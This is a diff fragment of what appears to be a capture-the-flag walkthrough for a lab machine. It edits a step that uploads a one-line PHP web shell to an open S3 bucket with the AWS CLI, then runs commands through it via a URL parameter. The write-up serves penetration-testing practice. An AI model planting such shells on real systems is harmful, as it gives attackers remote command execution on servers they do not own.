@@ -41,7 +41,7 @@ Step 7: Check for more information on what we can do on this s3 bucket by runnin
 
 We see from this that we can use the ‘PUT’ request method which is used to upload files.  
 
-Step 8: Upload a php command shell (`<?php system($_GET[“cmd”]); ?>`) to the bucket: aws s3 --no-sign-request --endpoint-url http://s3.bucket.htb cp /home/kali/Downloads/test.php s3://adserver/
+Step 8: Upload a php command shell (`<?php system($_GET[“cmd”]); ?>`) to the bucket: aws s3 --no-sign-request --endpoint-url http://s3.bucket.htb cp test.php s3://adserver/
 
 Navigate to the uploaded file: http://bucket.htb/test.php?cmd=whoami
 
